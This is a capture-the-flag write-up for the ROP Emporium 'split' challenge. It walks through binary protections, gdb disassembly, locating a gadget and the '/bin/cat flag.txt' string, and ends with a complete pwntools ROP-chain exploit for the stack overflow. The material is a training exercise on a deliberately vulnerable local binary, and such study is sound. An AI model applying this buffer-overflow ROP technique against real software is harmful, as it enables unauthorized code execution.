## Introduction
Challenge Description

>The elements that allowed you to complete ret2win are still present, they've just been split apart.
>Find them and recombine them using a short ROP chain

The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website [ropemporium](https://ropemporium.com). 

First we check the binary protections enabled on the downloaded. Only **NX** (Not executable) is enabled on the device according to `checksec` binary utility as shown in the image below.

```bash
vx@archie:split$ checksec --file=split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble **pwnme** function as in the image below.The function looks familiar as for the ret2win function.
```nasm
(gdb) disas pwnme
Dump of assembler code for function pwnme:

   0x0000000000400740 <+88>:	leave  
   0x0000000000400741 <+89>:	ret    
End of assembler dump.
(gdb) 
```
From the above code, we are filling  a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.

![](/static/images/ropemporium/stack.png)

Next function is **read** function, which reads for user input from the standard input file descriptor and stores in the specified buffer. From disassembled code, we are reading **0x60** bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.

```c
ssize_t read(int fd, void *buf, size_t count);
```
For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called **usefulFunction**. The usefulFunction, does listing of the files in the directory when called by the function.

```nasm
(gdb) disas usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret    
End of assembler dump.
(gdb) x/s 0x40084a
0x40084a:	"/bin/ls"
(gdb) 
```
Goal is to pass a different string to the system function instead of  **"/bin/ls"**

From the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.

>Now that you've gathered the elements of your exploit you can start to piece them together, you want to call system() with the **"/bin/cat flag.txt"** string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions. 

Opening the binary in radare2, we can use **iz** command to look for strings. The goal is to read the flag from the system.

```nasm
[0x004005b0]> iz
nth paddr      vaddr      len size section type  string

0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt

```

We have an important string **"/bin/cat flag.txt"** which will enable us to complete our goal. Now we need pass the string to system function as follows **system('/bin/cat flag.txt')**.

For building ropchain, we need to understand the calling conventions of **AMD64 ABI**.The calling convention passes the arguments to the registers in the following order **RDI, RSI, RDX, RCX, R8 and R9**.

Because the system function receives one argument, we need to look for one gadgets that we control the **rdi** address.

**What are gadgets?**
Gadgets are sequence of instructions the end with ret instruction. Because we want to load a value into rdi register, we look for a pop **pop rdi; ret** instruction in order to pass an argument to the system function.

For searching gadget in radare2/rizin, use **/R** command as shown in the image below.

Now we need to chain ropchain exploit as shown in the image below.

![ropchain](/static/images/ropemporium/popgadget.png)

The goal is to overwrite the return address with the address of **"pop rdi, ret "** and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and  8 bytes teo overwrite the return address with pop rdi address.

## Exploit
Full exploit of split challenge is;

```python3
import pwn

pwn.context.encoding = "latin-1"
pwn.warnings.simplefilter("ignore")
pwn.context.arch = "amd64"

io = pwn.process("./split")

system_addr = pwn.p64(0x400560)   #address of system 
pop_rdi_ret = pwn.p64(0x004007c3)  # pop rdi; ret gadget 
bin_cat_addr = pwn.p64(0x00601060)  #bin cat flag.txt address 

payload = b"A" * 32  #fill the buffer 
payload += b"B" *8   # overwrite  rbp
payload += pop_rdi_ret # pop rdi gadget 
payload += bin_cat_addr # argument passed to the system function
payload += system_addr   #call system 

io.writeafter('>', payload)

pwn.info(io.clean().decode())
```

Running the above code we get a flag.

>**To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.**
